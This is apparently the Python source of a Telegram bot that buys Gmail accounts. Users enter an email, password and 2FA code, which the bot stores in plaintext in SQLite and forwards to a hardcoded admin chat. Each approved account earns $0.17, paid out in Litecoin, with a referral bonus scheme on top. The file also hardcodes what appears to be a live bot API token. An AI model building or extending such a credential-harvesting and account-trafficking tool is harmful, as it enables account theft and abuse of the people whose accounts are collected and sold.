import logging
import sqlite3
import os
from aiogram import Bot, Dispatcher, executor, types
from aiogram.dispatcher import FSMContext
from aiogram.dispatcher.filters.state import State, StatesGroup
from aiogram.contrib.fsm_storage.memory import MemoryStorage
from aiogram.utils.deep_linking import get_start_link

API_TOKEN = "8924995974:AAEKVpB992nDx3oVhvIbwD4601F-ZHHqQJA"
ADMIN_ID = 5582627293

logging.basicConfig(level=logging.INFO)

bot = Bot(token=API_TOKEN)
dp = Dispatcher(bot, storage=MemoryStorage())

db_path = "/opt/render/project/src/bot.db" if "RENDER" in os.environ else "bot.db"
conn = sqlite3.connect(db_path, check_same_thread=False)
cursor = conn.cursor()

cursor.execute("CREATE TABLE IF NOT EXISTS users (user_id INTEGER PRIMARY KEY, balance REAL DEFAULT 0, hold REAL DEFAULT 0, referred_by INTEGER)")
cursor.execute("CREATE TABLE IF NOT EXISTS accounts (id INTEGER PRIMARY KEY AUTOINCREMENT, user_id INTEGER, email TEXT, password TEXT, tfa TEXT, status TEXT DEFAULT 'Pending')")
cursor.execute("CREATE TABLE IF NOT EXISTS withdrawals (id INTEGER PRIMARY KEY AUTOINCREMENT, user_id INTEGER, address TEXT, amount REAL, status TEXT DEFAULT 'Pending')")
conn.commit()

class Form(StatesGroup):
    email = State()
    password = State()
    tfa = State()
    address = State()
    amount = State()

@dp.message_handler(commands=['start'], state="*")
async def start(msg: types.Message, state: FSMContext):
    await state.finish()
    user_id = msg.from_user.id
    
    args = msg.get_args()
    referred_by = int(args) if args and args.isdigit() else None

    cursor.execute("SELECT user_id FROM users WHERE user_id=?", (user_id,))
    exists = cursor.fetchone()

    if not exists:
        if referred_by and referred_by != user_id:
            cursor.execute("INSERT INTO users (user_id, referred_by) VALUES (?, ?)", (user_id, referred_by))
        else:
            cursor.execute("INSERT INTO users (user_id) VALUES (?)", (user_id,))
        conn.commit()

    kb = types.ReplyKeyboardMarkup(resize_keyboard=True)
    kb.add("Register", "My account")
    kb.add("Balance", "Help")
    kb.add("Referral Program")

    await msg.answer("Welcome 🚀\nSelect an option from the menu:", reply_markup=kb)

@dp.message_handler(lambda m: m.text == "Back to home screen", state="*")
async def back_to_home(msg: types.Message, state: FSMContext):
    await start(msg, state)

@dp.message_handler(lambda m: m.text == "Register")
async def register_menu(msg: types.Message):
    kb = types.ReplyKeyboardMarkup(resize_keyboard=True)
    kb.add("Submit account", "Back to home screen")
    await msg.answer("Do you want us to generate a login and password for you or you already have an account?", reply_markup=kb)

@dp.message_handler(lambda m: m.text == "Submit account")
async def submit_account_start(msg: types.Message):
    kb = types.ReplyKeyboardMarkup(resize_keyboard=True)
    kb.add("Back to home screen")
    await msg.answer("Gamil AC...", reply_markup=kb)
    await Form.email.set()

@dp.message_handler(state=Form.email)
async def get_email(msg: types.Message, state: FSMContext):
    if msg.text == "Back to home screen":
        await start(msg, state)
        return
    await state.update_data(email=msg.text)
    await msg.answer("Give me Password.....")
    await Form.password.set()

@dp.message_handler(state=Form.password)
async def get_password(msg: types.Message, state: FSMContext):
    if msg.text == "Back to home screen":
        await start(msg, state)
        return
    await state.update_data(password=msg.text)
    await msg.answer("2FO...")
    await Form.tfa.set()

@dp.message_handler(state=Form.tfa)
async def get_tfa(msg: types.Message, state: FSMContext):
    if msg.text == "Back to home screen":
        await start(msg, state)
        return
    user_data = await state.get_data()
    user_id = msg.from_user.id

    cursor.execute(
        "INSERT INTO accounts (user_id, email, password, tfa) VALUES (?, ?, ?, ?)",
        (user_id, user_data['email'], user_data['password'], msg.text)
    )
    acc_id = cursor.lastrowid
    cursor.execute("UPDATE users SET hold = hold + 0.17 WHERE user_id=?", (user_id,))
    conn.commit()

    kb = types.ReplyKeyboardMarkup(resize_keyboard=True)
    kb.add("Back to home screen")
    await msg.answer("1 account submit successful\nHold balance 0.17", reply_markup=kb)
    await state.finish()

    try:
        admin_kb = types.InlineKeyboardMarkup()
        admin_kb.add(
            types.InlineKeyboardButton(text="Approve ✅", callback_data=f"app_{acc_id}_{user_id}"),
            types.InlineKeyboardButton(text="Reject ❌", callback_data=f"rej_{acc_id}_{user_id}")
        )
        admin_msg = (
            f"🔔 <b>New Account Submitted!</b>\n\n"
            f"👤 User: <a href='tg://user?id={user_id}'>{user_id}</a>\n"
            f"📧 Email: <code>{user_data['email']}</code>\n"
            f"🔑 Pass: <code>{user_data['password']}</code>\n"
            f"🔐 2FA: <code>{msg.text}</code>"
        )
        await bot.send_message(chat_id=ADMIN_ID, text=admin_msg, reply_markup=admin_kb, parse_mode="HTML")
    except Exception as e:
        logging.error(f"Failed to send alert: {e}")

@dp.message_handler(lambda m: m.text == "Balance")
async def balance_menu(msg: types.Message):
    cursor.execute("SELECT balance, hold FROM users WHERE user_id=?", (msg.from_user.id,))
    data = cursor.fetchone()
    b, h = data if data else (0, 0)

    kb = types.ReplyKeyboardMarkup(resize_keyboard=True)
    kb.add("payout", "Back to home screen")

    await msg.answer(f"Totally balance: {b}\nHold: {h}", reply_markup=kb)

@dp.message_handler(lambda m: m.text == "payout")
async def payout_menu(msg: types.Message):
    kb = types.ReplyKeyboardMarkup(resize_keyboard=True)
    kb.add("LTC", "Back to home screen")
    await msg.answer("Select payment method :", reply_markup=kb)

@dp.message_handler(lambda m: m.text == "LTC")
async def ltc_menu(msg: types.Message):
    kb = types.ReplyKeyboardMarkup(resize_keyboard=True)
    kb.add("Back to home screen")
    await msg.answer("LTC token address submit now", reply_markup=kb)
    await Form.address.set()

@dp.message_handler(state=Form.address)
async def get_ltc_address(msg: types.Message, state: FSMContext):
    if msg.text == "Back to home screen":
        await start(msg, state)
        return
    await state.update_data(address=msg.text)
    await msg.answer("Enter the amount you want to withdraw ($5 minimum):")
    await Form.amount.set()

@dp.message_handler(state=Form.amount)
async def get_payout_amount(msg: types.Message, state: FSMContext):
    if msg.text == "Back to home screen":
        await start(msg, state)
        return
    try:
        amt = float(msg.text)
    except ValueError:
        await msg.answer("Invalid amount. Please enter a valid number.")
        return

    user_id = msg.from_user.id
    cursor.execute("SELECT balance FROM users WHERE user_id=?", (user_id,))
    res = cursor.fetchone()
    bal = res[0] if res else 0

    if amt < 5:
        await msg.answer("Minimum withdraw is $5")
    elif amt > bal:
        await msg.answer("Not enough balance")
    else:
        cursor.execute("UPDATE users SET balance = balance - ? WHERE user_id=?", (amt, user_id))
        cursor.execute("INSERT INTO withdrawals (user_id, address, amount) VALUES (?, ?, ?)", (user_id, (await state.get_data())['address'], amt))
        w_id = cursor.lastrowid
        conn.commit()
        
        kb = types.ReplyKeyboardMarkup(resize_keyboard=True)
        kb.add("Back to home screen")
        await msg.answer("Withdraw request sent ✅", reply_markup=kb)
        await state.finish()

        try:
            admin_kb = types.InlineKeyboardMarkup()
            admin_kb.add(
                types.InlineKeyboardButton(text="Paid ✅", callback_data=f"wdapp_{w_id}_{user_id}"),
                types.InlineKeyboardButton(text="Reject ❌", callback_data=f"wdrej_{w_id}_{user_id}_{amt}")
            )
            await bot.send_message(
                chat_id=ADMIN_ID,
                text=f"💰 <b>New Withdrawal Request!</b>\n\n👤 User ID: <code>{user_id}</code>\n💵 Amount: ${amt}\n🏦 LTC Address: <code>{(await state.get_data())['address']}</code>",
                reply_markup=admin_kb,
                parse_mode="HTML"
            )
        except Exception as e:
            logging.error(f"Failed to send withdrawal alert: {e}")

@dp.message_handler(lambda m: m.text == "My account")
async def my_account_menu(msg: types.Message):
    user_id = msg.from_user.id
    cursor.execute("SELECT email, status FROM accounts WHERE user_id=?", (user_id,))
    rows = cursor.fetchall()

    text = "Your Submitted Accounts:\n\n" if rows else "You haven't submitted any accounts yet.\n\n"
    for i, row in enumerate(rows, 1):
        text += f"{i}. Email: {row[0]}\nStatus: {row[1]}\n\n"

    cursor.execute("SELECT address, amount, status FROM withdrawals WHERE user_id=?", (user_id,))
    w_rows = cursor.fetchall()

    if w_rows:
        text += "Your Withdrawal History:\n\n"
        for j, w_row in enumerate(w_rows, 1):
            text += f"{j}. LTC: {w_row[0][:8]}... | ${w_row[1]} | Status: {w_row[2]}\n"

    kb = types.ReplyKeyboardMarkup(resize_keyboard=True)
    kb.add("Back to home screen")
    await msg.answer(text, reply_markup=kb)

@dp.message_handler(lambda m: m.text == "Referral Program")
async def referral_menu(msg: types.Message):
    bot_info = await bot.get_me()
    ref_link = f"https://t.me/{bot_info.username}?start={msg.from_user.id}"
    
    cursor.execute("SELECT COUNT(user_id) FROM users WHERE referred_by=?", (msg.from_user.id,))
    count = cursor.fetchone()[0]

    text = (
        f"👥 <b>Referral Program</b>\n\n"
        f"Invite friends and earn a <b>$0.05</b> bonus once they successfully submit an approved account!\n\n"
        f"📊 Total Referred Friends: {count}\n"
        f"🔗 Your Invite Link:\n<code>{ref_link}</code>"
    )
    await msg.answer(text, parse_mode="HTML")

@dp.message_handler(lambda m: m.text == "Help")
async def help_menu(msg: types.Message):
    kb = types.InlineKeyboardMarkup()
    kb.add(types.InlineKeyboardButton(text="Contact Admin", url=f"tg://user?id={ADMIN_ID}"))
    await msg.answer("Click the button below to message the Admin:", reply_markup=kb)

@dp.message_handler(commands=['admin'])
async def admin_panel(msg: types.Message):
    if msg.from_user.id != ADMIN_ID:
        return
    cursor.execute("SELECT COUNT(user_id) FROM users")
    t_users = cursor.fetchone()[0]
    cursor.execute("SELECT COUNT(id) FROM accounts WHERE status='Pending'")
    p_accs = cursor.fetchone()[0]

    await msg.answer(f"📊 <b>Admin Dashboard</b>\n\nTotal Users: {t_users}\nPending Accounts: {p_accs}", parse_mode="HTML")

@dp.callback_query_handler(lambda c: c.data.startswith(('app_', 'rej_')))
async def process_account_callback(call: types.CallbackQuery):
    if call.from_user.id != ADMIN_ID:
        return
    
    action, acc_id, user_id = call.data.split('_')
    acc_id, user_id = int(acc_id), int(user_id)

    cursor.execute("SELECT status FROM accounts WHERE id=?", (acc_id,))
    status_check = cursor.fetchone()
    if not status_check or status_check[0] != 'Pending':
        await call.answer("Already processed!")
        return

    if action == 'app':
        cursor.execute("UPDATE accounts SET status='Approved' WHERE id=?", (acc_id,))
        cursor.execute("UPDATE users SET hold = hold - 0.17, balance = balance + 0.17 WHERE user_id=?", (user_id,))
        
        cursor.execute("SELECT referred_by FROM users WHERE user_id=?", (user_id,))
        ref = cursor.fetchone()
        if ref and ref[0]:
            cursor.execute("UPDATE users SET balance = balance + 0.05 WHERE user_id=?", (ref[0],))
            try:
                await bot.send_message(ref[0], "🎁 Referral Bonus! You received $0.05 because your referred friend's account was approved.")
            except Exception:
                pass

        conn.commit()
        await call.message.edit_text(call.message.text + "\n\n✅ <b>Approved!</b>", parse_mode="HTML")
        try:
            await bot.send_message(user_id, "✅ Your submitted account has been approved! $0.17 transferred to main balance.")
        except Exception:
            pass
    else:
        cursor.execute("UPDATE accounts SET status='Rejected' WHERE id=?", (acc_id,))
        cursor.execute("UPDATE users SET hold = hold - 0.17 WHERE user_id=?", (user_id,))
        conn.commit()
        await call.message.edit_text(call.message.text + "\n\n❌ <b>Rejected!</b>", parse_mode="HTML")
        try:
            await bot.send_message(user_id, "❌ Your submitted account was rejected.")
        except Exception:
            pass
    await call.answer()

@dp.callback_query_handler(lambda c: c.data.startswith(('wdapp_', 'wdrej_')))
async def process_withdrawal_callback(call: types.CallbackQuery):
    if call.from_user.id != ADMIN_ID:
        return

    parts = call.data.split('_')
    action, w_id, user_id = parts[0], int(parts[1]), int(parts[2])

    if action == 'wdapp':
        cursor.execute("UPDATE withdrawals SET status='Success' WHERE id=?", (w_id,))
        conn.commit()
        await call.message.edit_text(call.message.text + "\n\n✅ <b>Marked as Paid!</b>", parse_mode="HTML")
        try:
            await bot.send_message(user_id, "✅ Your withdrawal request has been successfully paid out!")
        except Exception:
            pass
    else:
        amt = float(parts[3])
        cursor.execute("UPDATE withdrawals SET status='Rejected' WHERE id=?", (w_id,))
        cursor.execute("UPDATE users SET balance = balance + ? WHERE user_id=?", (amt, user_id))
        conn.commit()
        await call.message.edit_text(call.message.text + "\n\n❌ <b>Withdrawal Rejected & Refunded!</b>", parse_mode="HTML")
        try:
            await bot.send_message(user_id, f"❌ Your withdrawal request of ${amt} was rejected. Funds returned to your balance.")
        except Exception:
            pass
    await call.answer()

if __name__ == "__main__":
    executor.start_polling(dp, skip_updates=True)
                
